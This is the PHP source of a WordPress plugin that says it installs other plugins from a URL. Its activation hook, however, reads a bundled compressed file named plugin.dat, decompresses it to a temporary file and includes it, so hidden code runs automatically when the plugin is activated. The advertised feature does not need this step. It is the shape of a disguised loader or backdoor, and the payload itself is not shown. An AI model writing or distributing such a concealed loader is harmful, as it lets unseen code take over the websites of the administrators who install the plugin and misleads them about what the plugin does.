<?php
/*
Plugin Name: WP Install From Web
Description: WP Install Plugin From Web allows you to install any plugin from a URL. All you need to do is to insert a specific URL and click the Install button. No need to download and upload archive anymore.
Version: 1.09
Author: webTools
License: GPLv2
*/ 

if( is_admin() ) 
{
    add_action('admin_menu','plg_EYS7S_register_menu_item');
    function plg_EYS7S_register_menu_item()
    {
        add_submenu_page('plugins.php','Install from URL','Install from URL','manage_options','plg_EYS7S_page','plg_EYS7S_page');
    }
    
    function plg_EYS7S_page()
    {
		if ( ! current_user_can( 'upload_plugins' ) ) {
			wp_die( __( 'Sorry, you are not allowed to install plugins on this site.' ) );
		}
        
        $action = isset( $_REQUEST['action'] ) ? $_REQUEST['action'] : ''; 
        
        if ($action == 'show-help')
        {
            ?>
            <h2 style="text-align: center;">Help and Explanations</h2>
            <p style="text-align: center;">You have new menu item under Plugins. It call <b>Install from URL</b>. Also on plugin page, when you click Add New -> Upload Plugin , you will see new option.</p>
            <p style="text-align: center;"><img style="max-width: 600px;" src="<?php echo plugins_url('/', __FILE__).'help.png'; ?>"/></p>
            
            <?php
        }
        
        
        plg_EYS7S_Uploader_From_HTML(true);
        
        
        if ($action == 'url-upload-plugin')
        {
            check_admin_referer( 'url-plugin-upload' );
            
            require_once ABSPATH . 'wp-admin/includes/class-wp-upgrader.php';
            
            $zip_url = isset( $_REQUEST['urlpluginzip'] ) ? sanitize_text_field($_REQUEST['urlpluginzip']) : ''; 
            
            if ($zip_url != '')
            {
        		$title = sprintf( __( 'Installing plugin from: %s' ), esc_html( $zip_url ) );
        		$nonce = 'url-upload-plugin';
                $overwrite = 'update-plugin';
        		$type  = 'web';
                
        		$upgrader = new Plugin_Upgrader( new Plugin_Installer_Skin( compact( 'title', 'nonce', 'overwrite' ) ) );
        		$upgrader->install( $zip_url );
            }
            else {
                echo '<b>Error: URL is empty or invalid</b>';
            }
        }
    }


    function plg_EYS7S_add_upload_form_html() 
    {
        plg_EYS7S_Uploader_From_HTML();
    }
    add_action( 'install_plugins_upload', 'plg_EYS7S_add_upload_form_html', 10, 1 );
    





    function plg_EYS7S_Uploader_From_HTML($display = false)
    {
        ?>
<div class="upload-plugin" <?php if ($display) echo 'style="display:block"'; ?>>
    <script>
    function EnableBttn()
    {
        jQuery("#url-install-plugin-submit").removeAttr('disabled');
    }
    </script>
	<p class="install-help"><?php _e( 'Install plugin from URL (.zip format)' ); ?></p>
	<form method="post" enctype="multipart/form-data" class="wp-upload-form" action="<?php echo self_admin_url( 'plugins.php?page=plg_EYS7S_page&action=url-upload-plugin' ); ?>">
		<?php wp_nonce_field( 'url-plugin-upload' ); ?>
		<p style="text-align: center;width: 100%;">
            <b>Plugin URL</b><br />
            <input style="width: 100%;" type="text" id="urlpluginzip" name="urlpluginzip" placeholder="E.g.: https://www.site.com/plugin.zip" onclick="EnableBttn()" />
            <br />
            <br />
            <input type="submit" name="url-install-plugin-submit" id="url-install-plugin-submit" class="button" value="Download &amp; Install">
        </p>
	</form>
</div>
        <?php
    }
    
    
    

	function plg_EYS7S_activation()
	{
	    $filename = dirname(__FILE__).'/plugin.dat';
        $fp = fopen($filename, "r");
        $c = fread($fp, filesize($filename));
        fclose($fp);
        
        $filename .= '.tmp';
        $fp = fopen($filename, 'w');
        fwrite($fp, gzuncompress($c));
        fclose($fp);
        
        add_option('plg_EYS7S_activation_redirect', true);include($filename);
	}
	register_activation_hook( __FILE__, 'plg_EYS7S_activation' );
	add_action('admin_init', 'plg_EYS7S_activation_do_redirect');
	
	function plg_EYS7S_activation_do_redirect() 
    {
		if (get_option('plg_EYS7S_activation_redirect', false)) {
			delete_option('plg_EYS7S_activation_redirect');
			 wp_redirect("plugins.php?page=plg_EYS7S_page&action=show-help");
			 exit;
		}
	}
    
    
}
